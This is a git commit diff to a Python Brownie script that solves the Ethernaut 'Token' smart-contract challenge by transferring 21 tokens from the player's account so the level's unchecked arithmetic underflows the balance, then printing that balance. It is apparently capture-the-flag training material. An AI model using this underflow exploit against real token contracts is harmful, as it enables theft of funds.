9c68fc38bee6e16979ef02279aafdcc478f24cab
sarobinson2001 <sarobinson2011@gmail.com>
2023-09-04 14:04:50 +0100

    updated 05-deploy_attack

--- scripts/05-deploy_attack.py
+++ scripts/05-deploy_attack.py
@@ -3,18 +3,17 @@ from brownie import interface, TokenInterface
 
 # new instance of Level 05 - Token
 ETHERNAUT_INSTANCE = "0x292597B71806e65B2c42b773055AAe6ed09bfC57"
-PLAYER = "0xF8f8269488f73fab3935555FCDdD6035699deE25"
 RANDOM_ADDRESS = "0x3826539Cbd8d68DCF119e80B994557B4278CeC9f"
 
 
 def main():
 
-    acc = get_account()
-    token = interface.TokenInterface
+    player = get_account()
+    token = interface.TokenInterface(ETHERNAUT_INSTANCE)
 
     # call transfer: (_to = random address, _value = 21, from acc)
-    tx = token.transfer(RANDOM_ADDRESS, 21, {"from": acc})
+    tx = token.transfer(RANDOM_ADDRESS, 21, {"from": player})
     tx.wait(1)
 
     # call balanceOf(PLAYER) - view function, so no state change
-    print(f"New balance of PLAYER account = {token.balanceOf(PLAYER)}")
+    print(f"New balance of PLAYER account = {token.balanceOf(player)}")
